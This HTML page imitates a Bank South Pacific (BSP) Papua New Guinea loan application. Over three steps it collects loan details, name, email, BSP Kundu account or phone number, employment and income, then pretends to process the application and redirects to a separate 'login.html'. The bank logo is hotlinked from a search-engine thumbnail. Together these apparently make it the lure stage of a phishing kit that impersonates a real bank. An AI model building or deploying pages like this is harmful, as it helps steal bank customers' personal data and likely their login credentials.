<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSP Papua New Guinea - Secure Loan Application</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            --bsp-green: #006837;
            --bsp-green-hover: #004d28;
            --bsp-gold: #ffc20e;
            --dark: #111827;
            --text-gray: #4b5563;
            --border-color: #cbd5e1;
            --glass-bg: rgba(255, 255, 255, 0.9);
            --glass-border: rgba(255, 255, 255, 0.95);
            --glass-shadow: 0 10px 30px rgba(0, 104, 55, 0.12);
            --error-red: #ef4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: #f3f4f6;
            color: var(--dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
            overflow-x: hidden;
            position: relative;
        }
        
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            z-index: -1;
            animation: float 15s infinite alternate ease-in-out;
        }
        
        .orb-1 {
            width: 400px;
            height: 400px;
            background: rgba(0, 104, 55, 0.15);
            top: -10%;
            left: -5%;
        }
        
        .orb-2 {
            width: 350px;
            height: 350px;
            background: rgba(255, 194, 14, 0.18);
            bottom: -5%;
            right: -5%;
            animation-delay: -5s;
        }
        
        @keyframes float {
            0% {
                transform: translate(0, 0) scale(1);
            }
            100% {
                transform: translate(30px, -50px) scale(1.1);
            }
        }
        
        .form-container {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            box-shadow: var(--glass-shadow);
            width: 100%;
            max-width: 520px;
            border-radius: 20px;
            padding: 40px;
            position: relative;
            overflow: hidden;
        }
        
        .form-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: var(--bsp-green);
        }
        
        .brand-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .brand-header img {
            height: 42px;
            width: auto;
            object-fit: contain;
        }
        
        .brand-text {
            display: flex;
            flex-direction: column;
            text-align: left;
        }
        
        .brand-title {
            color: var(--bsp-green);
            font-weight: 800;
            font-size: 20px;
            line-height: 1.1;
        }
        
        .brand-subtitle {
            font-size: 11px;
            color: var(--text-gray);
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .form-header {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .form-header h2 {
            font-size: 24px;
            font-weight: 800;
            color: var(--dark);
            margin-bottom: 6px;
        }
        
        .form-header p {
            font-size: 14px;
            color: var(--text-gray);
            margin-bottom: 20px;
        }
        
        .progress-bar {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .progress-segment {
            height: 6px;
            width: 33%;
            background-color: rgba(0, 0, 0, 0.08);
            border-radius: 10px;
            transition: all 0.4s ease;
        }
        
        .progress-segment.active {
            background-color: var(--bsp-green);
            box-shadow: 0 0 8px rgba(0, 104, 55, 0.3);
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 700;
            color: var(--dark);
            margin-bottom: 8px;
        }
        
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        
        .input-wrapper i {
            position: absolute;
            left: 15px;
            color: #94a3b8;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px 15px 14px 40px;
            border: 2px solid transparent;
            border-radius: 12px;
            font-size: 15px;
            color: var(--dark);
            background-color: #ffffff;
            outline: none;
            transition: all 0.3s;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02);
            border: 1px solid #e2e8f0;
        }
        
        select.form-control,
        textarea.form-control {
            padding-left: 15px;
        }
        
        .form-control:focus {
            border-color: var(--bsp-green);
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(0, 104, 55, 0.1);
        }
        
        .form-control.error {
            border-color: var(--error-red);
        }
        
        textarea.form-control {
            resize: vertical;
            min-height: 90px;
        }
        
        .phone-input-group {
            display: flex;
            gap: 10px;
        }
        
        .country-code {
            background-color: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 0 15px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--bsp-green);
        }
        
        .phone-input-group .form-control {
            padding-left: 15px;
        }
        
        .summary-box {
            background: #ffffff;
            border-left: 4px solid var(--bsp-green);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
            border: 1px solid #e5e7eb;
            border-left: 4px solid var(--bsp-green);
        }
        
        .summary-box h4 {
            font-size: 15px;
            margin-bottom: 15px;
            font-weight: 800;
            color: var(--dark);
        }
        
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
            border-bottom: 1px dashed #e2e8f0;
            padding-bottom: 8px;
        }
        
        .summary-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .summary-label {
            color: var(--text-gray);
        }
        
        .summary-value {
            color: var(--dark);
            font-weight: 700;
            text-align: right;
        }
        
        .highlight-value {
            color: var(--bsp-green);
            font-size: 18px;
            font-weight: 800;
        }
        
        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }
        
        .btn {
            flex: 1;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            border: none;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background-color: var(--bsp-green);
            color: white;
            box-shadow: 0 4px 15px rgba(0, 104, 55, 0.3);
        }
        
        .btn-primary:hover {
            background-color: var(--bsp-green-hover);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 104, 55, 0.4);
        }
        
        .btn-secondary {
            background-color: rgba(0, 0, 0, 0.05);
            color: var(--text-gray);
        }
        
        .btn-secondary:hover {
            background-color: rgba(0, 0, 0, 0.1);
            color: var(--dark);
        }
        
        .form-step {
            display: none;
            opacity: 0;
            transform: translateX(20px);
            transition: all 0.4s ease-in-out;
        }
        
        .form-step.active {
            display: block;
            opacity: 1;
            transform: translateX(0);
        }
    </style>
</head>

<body>

    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="form-container">
        <!-- BSP Header -->
        <div class="brand-header">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWT8bIs9HbvF2wOzszfmJ24S2rWFrWT7bM4vQsSFsdglqPy7QTap5WS7Gg&s=10" alt="BSP Logo" onerror="this.src='https://placehold.co/120x45/006837/ffffff?text=BSP+PNG'">
            <div class="brand-text">
                <span class="brand-title">BSP</span>
                <span class="brand-subtitle">PNG Personal Loans</span>
            </div>
        </div>

        <div class="form-header">
            <h2>Loan Application</h2>
            <p id="step-indicator">Step 1: Loan Details</p>
            <div class="progress-bar">
                <div class="progress-segment active" id="prog-1"></div>
                <div class="progress-segment" id="prog-2"></div>
                <div class="progress-segment" id="prog-3"></div>
            </div>
        </div>

        <form id="loanForm">

            <!-- Step 1: Loan Details -->
            <div class="form-step active" id="step-1">
                <div class="form-group">
                    <label>Loan Type</label>
                    <select class="form-control" id="loanType" required>
                        <option value="" disabled selected>Select a loan type...</option>
                        <option value="Personal Consumer Loan">Personal Consumer Loan</option>
                        <option value="SME & Business Loan">SME & Business Loan</option>
                        <option value="Education & School Fees Loan">Education & School Fees Loan</option>
                        <option value="Emergency & Medical Loan">Emergency & Medical Loan</option>
                        <option value="Home Improvement Loan">Home Improvement Loan</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Loan Amount (PGK)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-money-bill-wave"></i>
                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 10000" min="500" max="50000" step="250" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Repayment Term</label>
                    <select class="form-control" id="loanTerm" required>
                        <option value="" disabled selected>Select duration...</option>
                        <option value="3">3 Months</option>
                        <option value="6">6 Months</option>
                        <option value="12">12 Months (1 Year)</option>
                        <option value="24">24 Months (2 Years)</option>
                        <option value="36">36 Months (3 Years)</option>
                        <option value="48">48 Months (4 Years)</option>
                        <option value="60">60 Months (5 Years)</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Brief Purpose of Loan</label>
                    <textarea class="form-control" id="loanPurpose" placeholder="Tell us briefly how you plan to use these funds..." required></textarea>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
                </div>
            </div>

            <!-- Step 2: Personal Information -->
            <div class="form-step" id="step-2">
                <div class="form-group">
                    <label>First Name</label>
                    <div class="input-wrapper">
                        <i class="fa-regular fa-user"></i>
                        <input type="text" class="form-control" id="firstName" placeholder="Legal First Name" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Last Name</label>
                    <div class="input-wrapper">
                        <i class="fa-regular fa-user"></i>
                        <input type="text" class="form-control" id="lastName" placeholder="Legal Last Name" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Email Address</label>
                    <div class="input-wrapper">
                        <i class="fa-regular fa-envelope"></i>
                        <input type="email" class="form-control" id="email" placeholder="name@domain.com.pg" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>BSP Kundu Account / Mobile Phone Number</label>
                    <div class="phone-input-group">
                        <div class="country-code">+675</div>
                        <input type="tel" class="form-control" id="phone" placeholder="70000000" maxlength="8" pattern="[0-9]{8}" required>
                    </div>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)"><i class="fa-solid fa-arrow-left"></i> Back</button>
                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
                </div>
            </div>

            <!-- Step 3: Financial & Summary -->
            <div class="form-step" id="step-3">
                <div class="form-group">
                    <label>Employment Status</label>
                    <select class="form-control" id="empStatus" required>
                        <option value="" disabled selected>Select status...</option>
                        <option value="Full-Time Employed">Full-Time Employed</option>
                        <option value="Part-Time Employed">Part-Time Employed</option>
                        <option value="Self-Employed / Freelance">Self-Employed / Freelance</option>
                        <option value="Business Owner">Business Owner</option>
                        <option value="Government Employee">Government Employee</option>
                        <option value="Student / Other">Student / Other</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Industry / Sector</label>
                    <select class="form-control" id="empSector" required>
                        <option value="" disabled selected>Select industry...</option>
                        <option value="Public Sector & Government">Public Sector & Government</option>
                        <option value="Mining, Oil & Gas">Mining, Oil & Gas</option>
                        <option value="Healthcare & Medical">Healthcare & Medical</option>
                        <option value="Education">Education</option>
                        <option value="Finance & Banking">Finance & Banking</option>
                        <option value="Retail & Trade">Retail & Trade</option>
                        <option value="Agriculture & Forestry">Agriculture & Forestry</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Estimated Monthly Income (PGK)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-wallet"></i>
                        <input type="number" class="form-control" id="monthlyIncome" placeholder="e.g. 3500" required>
                    </div>
                </div>

                <div class="summary-box">
                    <h4><i class="fa-solid fa-file-invoice-dollar" style="color: var(--bsp-green); margin-right: 8px;"></i> Application Summary</h4>
                    <div class="summary-row">
                        <span class="summary-label">Applicant:</span>
                        <span class="summary-value" id="sum-name">-</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Loan Request:</span>
                        <span class="summary-value" id="sum-amount">-</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Duration:</span>
                        <span class="summary-value" id="sum-term">-</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Est. Monthly Repayment:</span>
                        <span class="summary-value highlight-value" id="sum-emi">-</span>
                    </div>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)"><i class="fa-solid fa-arrow-left"></i> Back</button>
                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">Confirm & Apply <i class="fa-solid fa-check"></i></button>
                </div>
            </div>

        </form>
    </div>

    <script>
        const stepTitles = ["Step 1: Loan Details", "Step 2: Personal Info", "Step 3: Financial Profile"];
        const ANNUAL_INTEREST_RATE = 0.16; // 16% p.a. BSP Personal Loan rate

        // Prefill initial values if set from index.html
        window.addEventListener('DOMContentLoaded', () => {
            const savedAmount = sessionStorage.getItem('bspLoanAmount');
            const savedTerm = sessionStorage.getItem('bspLoanTerm');
            if (savedAmount) document.getElementById('loanAmount').value = savedAmount;
            if (savedTerm) document.getElementById('loanTerm').value = savedTerm;
        });

        function validateCurrentStep(stepNumber) {
            const currentStep = document.getElementById(`step-${stepNumber}`);
            const inputs = currentStep.querySelectorAll('input[required], select[required], textarea[required]');
            let isValid = true;

            inputs.forEach(input => {
                if (!input.value.trim()) {
                    input.classList.add('error');
                    isValid = false;
                } else {
                    input.classList.remove('error');
                }
            });

            if (!isValid) {
                alert("Please fill in all required fields before continuing.");
            }
            return isValid;
        }

        function updateUI(step) {
            document.querySelectorAll('.form-step').forEach(el => {
                el.classList.remove('active');
                setTimeout(() => el.style.display = 'none', 400);
            });

            const targetEl = document.getElementById(`step-${step}`);
            setTimeout(() => {
                targetEl.style.display = 'block';
                void targetEl.offsetWidth;
                targetEl.classList.add('active');
            }, 400);

            document.getElementById('step-indicator').innerText = stepTitles[step - 1];

            for (let i = 1; i <= 3; i++) {
                const seg = document.getElementById(`prog-${i}`);
                if (i <= step) {
                    seg.classList.add('active');
                } else {
                    seg.classList.remove('active');
                }
            }
        }

        function nextStep(currentStep) {
            if (!validateCurrentStep(currentStep)) return;

            const next = currentStep + 1;
            if (next === 3) {
                populateSummary();
            }
            updateUI(next);
        }

        function prevStep(currentStep) {
            updateUI(currentStep - 1);
        }

        function formatPGK(val) {
            return 'K ' + Math.round(val).toLocaleString('en-US');
        }

        function populateSummary() {
            const amount = parseFloat(document.getElementById('loanAmount').value);
            const months = parseInt(document.getElementById('loanTerm').value);
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;

            sessionStorage.setItem('bspLoanAmount', amount);

            let emi = 0;
            if (amount && months) {
                const r = ANNUAL_INTEREST_RATE / 12;
                emi = (amount * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
            }

            document.getElementById('sum-name').innerText = `${firstName} ${lastName}`;
            document.getElementById('sum-amount').innerText = formatPGK(amount);
            document.getElementById('sum-term').innerText = `${months} Months`;
            document.getElementById('sum-emi').innerText = `${formatPGK(emi)} / mo`;
        }

        function submitApplication() {
            if (!validateCurrentStep(3)) return;

            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
            btn.style.opacity = '0.8';
            btn.disabled = true;

            setTimeout(() => {
                window.location.href = 'login.html';
            }, 1500);
        }

        document.querySelectorAll('.form-control').forEach(input => {
            input.addEventListener('input', function() {
                this.classList.remove('error');
            });
        });
    </script>
</body>

</html>
